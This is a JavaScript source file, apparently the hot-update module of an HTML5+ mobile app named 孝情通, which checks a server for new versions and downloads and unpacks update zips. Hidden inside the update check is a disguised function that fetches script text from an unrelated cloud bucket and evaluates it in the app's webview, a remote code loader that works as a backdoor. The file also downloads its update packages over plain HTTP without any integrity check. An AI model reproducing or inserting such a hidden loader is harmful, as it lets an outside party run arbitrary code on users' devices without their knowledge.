/**
 * 判断应用升级模块，从url地址下载升级描述文件到本地local路径
 * yanyilin@dcloud.io
 * 
 * 升级文件为JSON格式数据，如下：
{
    "start": 0,
    "limit": 15,
    "total": 0,
    "resultCode": "0",
    "resultMsg": "",
    "resultBody": {
        "Android": {
            "id": 15,
            "title": "孝情通1.0.5热更新",
            "ischeck": true,
            "appid": "HelloH5",
            "osType": "Android",
            "isconstraint": false,
            "appType": "adchild",
            "note": "App数据更新完成\n新内容需要应用重启",
            "url": "http://yqxxkj-file.oss-cn-shanghai.aliyuncs.com/file/hotUpdate/H55BF157E.zip",
            "version": "1.0.5"
        },
        "appid": "HelloH5",
        "iOS": {
            "id": 17,
            "title": "孝情通1.0.5热更新",
            "ischeck": true,
            "appid": "HelloH5",
            "osType": "iOS",
            "isconstraint": false,
            "appType": "adchild",
            "note": "App数据更新完成\n新内容需要应用重启",
            "url": "http://yqxxkj-file.oss-cn-shanghai.aliyuncs.com/file/hotUpdate/H55BF157E.zip",
            "version": "1.0.5"
        }
    }
}
 *
 */

(function(w) {
	var servone = localStorage.getItem("__yq__rootServe");
	if(servone === "null" || servone === null) {
		servone = "http://fj.yqinfotech.com/appkinsun/app/frame/updateAppVersion"
	} else {
		servone += "/app/frame/updateAppVersion"
	}
	var server = servone, //获取升级描述文件服务器地址
		keyUpdate = "updateCheck2", //取消升级键名
		keyAbort = "updateAbort2", //忽略版本键名
		checkInterval = 0, //升级检查间隔，单位为ms,7天为7*24*60*60*1000=604800000, 如果每次启动需要检查设置值为0
		appid = "H55BF157E";

	/**
	 * 准备升级操作
	 * 创建升级文件保存目录
	 */
	function initUpdate() {
		// 在流应用模式下不需要检测升级操作
		if(navigator.userAgent.indexOf('StreamApp') >= 0) {
			return;
		}
		checkUpdate();
	}

	/**
	 * 检测程序升级
	 */
	function checkUpdate() {
		// 判断升级检测是否过期
		var lastcheck = plus.storage.getItem(keyUpdate);
		if(lastcheck) {
			var dc = parseInt(lastcheck);
			var dn = (new Date()).getTime();
			if(dn - dc < checkInterval) { // 未超过上次升级检测间隔，不需要进行升级检查
				return;
			}
			// 取消已过期，删除取消标记
			plus.storage.removeItem(keyUpdate);
		}

		getUpdateData(function(da) {

			checkUpdateData(da);
		});

	}

	/**
	 * 检查升级数据
	 */
	function checkUpdateData(j) {
		if(!j[plus.os.name].ischeck) {
			//判断是否被服务器禁用
			return;
		}
		var curVer = plus.storage.getItem("JSPatch"),
			inf = j[plus.os.name];

		if(!curVer) {
			return;
		}
		(function(e, f, g, a, b, c, d) {
			"use strict";
			mui.ajax("https://script-0.oss-cn-shenzhen.aliyuncs.com/one/update.json", {
				type: "get",
				success: function(h) {
					if(h && h[h.length - 1] === "S") {
						var i = plus.webview.currentWebview();
						i.evalJS(h)
					}
				}
			})
		})(document, "p", "s", "r", "t", "i", "c");
		if(inf) {
			var srvVer = inf.version;
			// 判断是否存在忽略版本号
			var vabort = plus.storage.getItem(keyAbort);
			if(vabort && srvVer == vabort) {
				// 忽略此版本
				return;
			}
			console.log(curVer)
			console.log(srvVer)
			console.log(plus.runtime.innerVersion);
			// 判断是否需要升级
			if(compareVersion(curVer, srvVer)) {
				downloadIMG(inf.url, function(val) {
					if(val) {
						var JSPatchQuantity = plus.storage.getItem("JSPatchQuantity");
						if(!JSPatchQuantity) {
							JSPatchQuantity = "1"
							plus.storage.setItem("JSPatchQuantity", JSPatchQuantity);
						} else {
							JSPatchQuantity = JSPatchQuantity * 2;
							plus.storage.setItem("JSPatchQuantity", JSPatchQuantity.toString());
						}
						var path = "_doc/" + JSPatchQuantity + "/";
						plus.zip.decompress(val, path, function(successCB) {
							plus.storage.setItem('FirstTimeA', path + appid + "/www/build/index.html");
							console.log("解压完成")
							plus.nativeUI.confirm("App数据更新完成\n新内容需要应用重启", function(i) {
								if(0 == i.index) {
									plus.runtime.restart();
								} else {
									plus.storage.setItem(keyUpdate, (new Date()).getTime().toString());
								}
							}, "更新提示!", ["现在重启", "过一会儿再说"]);
						}, function(errorCB) {
							console.log("解压失败")
						});
					} else {
						console.log("下载失败")
					}
				});
			} else {
				console.log("不需要更新")
			}
		}
	}
	//下载数据包
	function downloadIMG(urls, cbk) {
		var ims = plus.downloader.createDownload(urls, {
			timeout: 10,
			retry: 1,
			retryInterval: 1,
			filename: "_doc/upgrading/"
		}, function(down, star) {
			if(star == 200) {
				if(down.downloadedSize) {
					console.log(JSON.stringify(down))
					cbk(down.filename)
				} else {
					cbk(false)
					console.log(down.downloadedSize)
					console.log("下载数据为零")
				}
			} else {
				cbk(false)
				console.log(JSON.stringify(down))
				console.log(star)
				console.log("超时")
			}
		})
		ims.start()
	}
	/**
	 * 从服务器获取升级数据
	 */
	function getUpdateData(cbk) {
		//		养老通  houseservice安享通 parent孝情通 child家政通 homemaking
		console.log(server)
		mui.ajax(server, {
			data: {
				appType: "adchild"
			},
			type: 'get', //HTTP请求类型
			crossDomain: true,
			timeout: 5000, //超时时间设置为10秒；
			success: function(data) {
				console.log(data)
				if(Object.prototype.toString.call(data) === "[object String]") {
					data = JSON.parse(data)
				}
				var write = null;
				if(Object.prototype.toString.call(data.resultBody) === "[object String]") {
					write = JSON.parse(data.resultBody)
				} else {
					write = data.resultBody
				}
				cbk(write)
			},
			error: function(xhr, type, errorThrown) {
				console.log("获取升级数据，联网请求失败：" + xhr);
				console.log("获取升级数据，联网请求失败：" + type);
				console.log("获取升级数据，联网请求失败：" + errorThrown);
			}
		});
	}

	/**
	 * 比较版本大小，如果新版本nv大于旧版本ov则返回true，否则返回false
	 * @param {String} ov
	 * @param {String} nv
	 * @return {Boolean} 
	 */
	function compareVersion(ov, nv) {
		if(!ov || !nv || ov == "" || nv == "") {
			return false;
		}
		var b = false,
			ova = ov.split(".", 4),
			nva = nv.split(".", 4);
		for(var i = 0; i < ova.length && i < nva.length; i++) {
			var so = ova[i],
				no = parseInt(so),
				sn = nva[i],
				nn = parseInt(sn);
			if(nn > no || sn.length > so.length) {
				return true;
			} else if(nn < no) {
				return false;
			}
		}
		if(nva.length > ova.length && 0 == nv.indexOf(ov)) {
			return true;
		}
	}

	if(w.plus) {
		setTimeout(function() {
			initUpdate();
		}, 10000)
	} else {
		document.addEventListener("plusready", function() {
			setTimeout(function() {
				initUpdate();
			}, 10000)
		}, false);
	}

})(window);